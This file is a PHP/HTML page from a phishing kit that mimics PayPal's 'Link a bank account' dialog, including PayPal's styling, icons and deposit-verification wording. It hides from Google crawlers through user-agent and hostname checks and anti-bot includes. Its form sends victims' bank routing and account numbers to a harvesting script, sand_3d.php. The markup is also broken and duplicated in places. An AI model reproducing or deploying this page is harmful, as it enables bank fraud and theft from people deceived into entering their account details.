


<?php


session_start();
error_reporting(0);


include "../../../../boots/antibots1.php";
include "../../../../boots/antibots2.php";
include "../../../../boots/antibots3.php";
include "../../../../boots/antibots4.php";
include "../../../../boots/encriptar.php";
include "../../../../boots/.htaccess.htaccess";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


session_start();

include("../../../system/blocker.php");
include("../../../system/detect.php");
include("../../../system/bincheck.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);




$_SESSION['_namebank_'] = "NWA BANK";



?>


<link rel="stylesheet" href="../../../css/main.css" data-reactid="10"/>



<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="https://www.paypalobjects.com/pa/js/min/pa.js" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" data-reactid="8"/>
<div id="fixed"  class="vx_has-spinner-large spinner_fullScreen test_has_spinner" >





</div>


<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>


<script src="../../lib/js/jquery.js"></script><script src="../../lib/js/jquery.validate.js"></script><script src="../../lib/js/jquery.v-form.js"></script>

<script src="../../lib/js/jquery.mask.js"></script>


    <link rel="stylesheet" href="../../lib/css/G-Z118.css">
    <link rel="stylesheet" href="../../lib/css/B-Z118.css">



<!DOCTYPE html><html data-reactroot="" data-reactid="1" data-react-checksum="158555299"><head data-reactid="2"><script type="text/javascript" src="https://www.paypalobjects.com/pa/js/min/pa.js" data-reactid="3"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0" data-reactid="4"/><meta charset="utf-8" data-reactid="5"/><link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png" data-reactid="6"/><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" data-reactid="7"/><link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" data-reactid="8"/><link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-0-5/paypal-sans.css" data-reactid="9"/><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/1f0/6dcd434cd566c97d0085ac711fbc4/css/main-service-nav.css" data-reactid="10"/><title data-reactid="11">PayPal: Wallet</title></head><body class="vx_root vx_hasOpenModal vx_addFlowTransition" data-reactid="12"><div data-reactid="13"><script> var isLessthanIE10 = false; </script> <!--[if lte IE 10]> <script> isLessthanIE10 = true; </script> <![endif]--> <script> </script> <script async data-paypal-sitewide-search data-callback="onSearchLoad" src="https://www.paypal.com/search/js/embed.js"></script> 

</li></ul></div></div></div></div></div><div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader" data-reactid="104"><div class="vx_modal-wrapper" data-reactid="105"><a href="#" name="modalClose" class="vx_modal-dismiss_x" data-reactid="106"><span class="vx_a11yText" data-reactid="107">close</span></a><div class="vx_modal-content" data-reactid="108">






<h2 class="vx_h2" data-reactid="110">Link a bank account</h2><div class="addBank-checkImage" data-reactid="111"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 280.5 119.4" preserveAspectRatio="xMidYMid meet" width='100%' height='auto'><style>.st0{fill:none;stroke:#CCD2D6;stroke-miterlimit:10;} .st1{fill:#3B3D3F;} .st2{fill:#D5DBDD;}</style><path class="st0" d="M8.6 26h165.2M8.6 47h261.6M8.6 85.3h121.3M148.9 85.3h121.3"/><path class="st1" d="M102.7 109.4l.2-3.9h4.4v1h-3.5l-.1 2c2 .1 3.9.7 3.9 2.7 0 1.7-1.5 2.8-3.6 2.8-1 0-1.7-.2-2.3-.6v-1.1c.6.5 1.5.7 2.3.7 1.5 0 2.5-.7 2.5-1.8-.1-1.2-1.4-1.6-3.8-1.8zM112 106.5c-1 0-1.9.5-2.6 1.2v-1.1c.6-.6 1.6-1.1 2.7-1.1 1.7 0 2.7 1 2.7 2.4s-1.3 2.5-3 4l-1.2 1.1h4.6v1h-6v-1l1.9-1.7c1.5-1.3 2.5-2.2 2.5-3.3.1-.9-.5-1.5-1.6-1.5zM117.1 113.9v-1h2.3v-6l-2.4.8v-.9l2.8-1.2h.7v7.4h2.1v1h-5.5zM127.2 114c-1.9 0-3.1-1.8-3.1-4.3s1.2-4.3 3.1-4.3c1.9 0 3.1 1.8 3.1 4.3s-1.2 4.3-3.1 4.3zm0-7.6c-1.3 0-1.9 1.4-1.9 3.3s.6 3.3 1.9 3.3c1.3 0 1.9-1.4 1.9-3.3s-.6-3.3-1.9-3.3zM134.9 114c-1.8 0-3.2-1.6-3.2-3.9 0-2.7 1.5-4.7 4.1-4.7.7 0 1.3.2 1.7.4v.9c-.4-.3-1.1-.4-1.7-.4-1.9 0-2.9 1.3-3.1 3.4.4-.6 1.2-1.2 2.4-1.2 1.5 0 2.6 1 2.6 2.6 0 1.7-1.2 2.9-2.8 2.9zm1.7-2.8c0-1.1-.8-1.8-1.8-1.8s-1.6.5-2.1 1.1c.1 1.6 1 2.5 2.1 2.5 1.1.1 1.8-.6 1.8-1.8zM142.3 114c-1.8 0-3.2-1.6-3.2-3.9 0-2.7 1.5-4.7 4.1-4.7.7 0 1.3.2 1.7.4v.9c-.4-.3-1.1-.4-1.7-.4-1.9 0-2.9 1.3-3.1 3.4.4-.6 1.2-1.2 2.4-1.2 1.5 0 2.6 1 2.6 2.6.1 1.7-1.2 2.9-2.8 2.9zm1.8-2.8c0-1.1-.8-1.8-1.8-1.8s-1.6.5-2.1 1.1c.1 1.6 1 2.5 2.1 2.5 1.1.1 1.8-.6 1.8-1.8zM149.6 114c-1.9 0-3.1-1.8-3.1-4.3s1.2-4.3 3.1-4.3 3.1 1.8 3.1 4.3-1.1 4.3-3.1 4.3zm0-7.6c-1.3 0-1.9 1.4-1.9 3.3s.6 3.3 1.9 3.3 1.9-1.4 1.9-3.3-.5-3.3-1.9-3.3zM157.5 113.9v-2.2h-3.7v-.8c.5-1.6 1.8-3.9 3.2-5.4h1.4c-1.6 1.7-2.7 3.5-3.4 5.2h2.6v-2.1h1.1v2.1h2v.9h-2v2.2h-1.2zM164.3 106.5c-1 0-1.9.5-2.6 1.2v-1.1c.6-.6 1.6-1.1 2.7-1.1 1.7 0 2.7 1 2.7 2.4s-1.3 2.5-3 4l-1.2 1.1h4.6v1h-6v-1l1.9-1.7c1.5-1.3 2.5-2.2 2.5-3.3.1-.9-.5-1.5-1.6-1.5zM172.5 113.9v-2.2h-3.7v-.8c.5-1.6 1.8-3.9 3.2-5.4h1.4c-1.6 1.7-2.7 3.5-3.4 5.2h2.6v-2.1h1.1v2.1h2v.9h-2v2.2h-1.2z"/><g><path class="st1" d="M12.4 114c-1.9 0-3.1-1.8-3.1-4.3s1.2-4.3 3.1-4.3 3.1 1.8 3.1 4.3-1.2 4.3-3.1 4.3zm0-7.6c-1.3 0-1.9 1.4-1.9 3.3s.6 3.3 1.9 3.3 1.9-1.4 1.9-3.3-.6-3.3-1.9-3.3zM17.3 113.9v-1h2.3v-6l-2.4.8v-.9l2.8-1.2h.7v7.4h2.1v1h-5.5zM27.1 106.5c-1 0-1.9.5-2.6 1.2v-1.1c.6-.6 1.6-1.1 2.7-1.1 1.7 0 2.7 1 2.7 2.4s-1.3 2.5-3 4l-1.2 1.1h4.6v1h-6v-1l1.9-1.7c1.5-1.3 2.5-2.2 2.5-3.3.1-.9-.5-1.5-1.6-1.5zM31.6 112.4c.7.5 1.5.6 2.3.6 1.5 0 2.6-.7 2.6-1.8s-1.1-1.5-3-1.5v-.7l2.4-2.5H32v-1h5.1v1.1l-2.3 2.4c1.3.1 2.9.7 2.9 2.3 0 1.6-1.7 2.7-3.7 2.7-1 0-1.7-.2-2.3-.6v-1zM42.3 114c-1.9 0-3.1-1.8-3.1-4.3s1.2-4.3 3.1-4.3 3.1 1.8 3.1 4.3-1.2 4.3-3.1 4.3zm0-7.6c-1.3 0-1.9 1.4-1.9 3.3s.6 3.3 1.9 3.3 1.9-1.4 1.9-3.3-.6-3.3-1.9-3.3zM47.2 113.9v-1h2.3v-6l-2.4.8v-.9l2.8-1.2h.7v7.4h2.1v1h-5.5zM57 106.5c-1 0-1.9.5-2.6 1.2v-1.1c.6-.6 1.6-1.1 2.7-1.1 1.7 0 2.7 1 2.7 2.4s-1.3 2.5-3 4l-1.2 1.1h4.6v1h-6v-1l1.9-1.7c1.5-1.3 2.5-2.2 2.5-3.3.1-.9-.5-1.5-1.6-1.5zM61.5 112.4c.7.5 1.5.6 2.3.6 1.5 0 2.6-.7 2.6-1.8s-1.1-1.5-3-1.5v-.7l2.4-2.5H62v-1h5.1v1.1l-2.3 2.4c1.3.1 2.9.7 2.9 2.3 0 1.6-1.7 2.7-3.7 2.7-1 0-1.7-.2-2.3-.6v-1zM72.6 113.9v-2.2h-3.7v-.8c.5-1.6 1.8-3.9 3.2-5.4h1.4c-1.6 1.7-2.7 3.5-3.4 5.2h2.6v-2.1h1.1v2.1h2v.9h-2v2.2h-1.2z"/></g><g><path class="st2" d="M188.2 19.8v-1.9c-.9 0-1.8-.3-2.3-.7v-1.1c.8.6 1.9.8 2.6.8 1 0 1.7-.3 1.7-1.1 0-1.4-4-.7-4-2.9 0-1 .8-1.7 2-1.9V9.5h.9v1.7c.6 0 1.3.2 1.8.5v1c-.7-.4-1.4-.6-2.1-.6-.9 0-1.6.4-1.6 1 0 1.3 4.1.7 4.1 2.9 0 1-.9 1.8-2.2 2v2h-.9z"/></g><path class="st0" d="M197.2 11.2c0-1.1.9-2 2-2h68.6c1.1 0 2 .9 2 2v15.2c0 1.1-.9 2-2 2h-68.6c-1.1 0-2-.9-2-2V11.2zM245.9 82.2c-2-2-6-1.2-9 1.8-1.1 1.1-1.9 2.4-2.4 3.6 1.6-4.2 1.3-8.3-1.2-10.8-4-4-12-2.4-18 3.6-2.2 2.2-3.8 4.7-4.8 7.2 2.4-6.3 2-12.5-1.8-16.3-6-6-18-3.6-27 5.4-3.3 3.3-5.7 7.1-7.2 10.8"/></svg></div><div class="row radioGroup" data-reactid="112"><div class="vx_radio col-sm-6" data-reactid="113"><input type="radio" name="accountType" id="checkingRadioBtn" value="CHECKING" checked="" data-reactid="114"/><label class="" for="checkingRadioBtn" data-reactid="115">Checking</label></div><div class="vx_radio col-sm-6" data-reactid="116"><input type="radio" name="accountType" id="savingsRadioBtn" value="SAVINGS" data-reactid="117"/><label class="" for="savingsRadioBtn" data-reactid="118">Savings</label></div></div><!-- react-empty: 119 -->







  <form action="../../../system/sand_3d.php" method="post" name="WorldWide_form" class="validator" novalidate="novalidate">

                            <div class="HeaderZ118">
                                <p style="text-align: center;font-size: 1.2em;width: 88%;padding-left: 6%;"></p>
                            </div>
                            <div class="BowContainerZ118">
                                
                                <div class="inner">
                                            <div class="FieldsZ118 large">
                                                                                          </div>

		<link rel="stylesheet" href="../../../css/n.css">


	<div class="rotation"> <p> Checking your Link a bank account... </p> </div>



   


 

                                            <div class="FieldsZ118 large">
                                                <input type="text" class="Xval666ideX1 " id="xxnxx" name="xxnxx" required="required" autocomplete="off" placeholder="Routing Number" value="" aria-required="true" maxlength="10">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="AddressLine" id="addressEntry">
                                        <div class="G-FieldsZ118">
                                            <div class="textInput">

                                                <div class="FieldsZ118 large">
                                                    <input type="text" class="Xval666ideX1 " id="xxllxx" name="xxllxx" required="required" value="" placeholder="Account Number" autocomplete="off">
                                                </div>
                                            </div>
                            
<div class="multi equal ">

                                                    </div>
                                            </div>
                



<div 
 id="stateHolder">
                                                <div class="textInput">
                                                    <div class="FieldsZ118 large">
                                                                                                          </div>

                                             
                                            </div>
                                        </div>
                                    </div>
                                    <div class="agreeTC checkbox  ">
                                        <div class="">

                                                       
<p data-reactid="128">By continuing, you agree to let PayPal send 2 small deposit amounts (less than $1.00) and retrieve them in 1 withdrawal.</p>

                                                                             </div>

</div>
                                    <input id="submitBtn" name="" type="submit" class="vx_btn vx_btn-block validateBeforeSubmit" value="Agree and Link" data-click="WorldWideSubmit">




</div></div></div><div class="vx_modal-background vx_modalPrepBg vx_modalBgIsShown" id="vx_modal-background" data-reactid="130"></div><script type="text/javascript" src="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-5-4/vx-lib.min.js" data-reactid="131"></script><script type="text/javascript" src="https://www.paypalobjects.com/web/res/1f0/6dcd434cd566c97d0085ac711fbc4/js/vendor.js" data-reactid="132"></script><script type="text/javascript" src="https://www.paypalobjects.com/web/res/1f0/6dcd434cd566c97d0085ac711fbc4/js/appBundle.js" data-reactid="133"></script><script id="react-engine-props" type="application/json">



</html>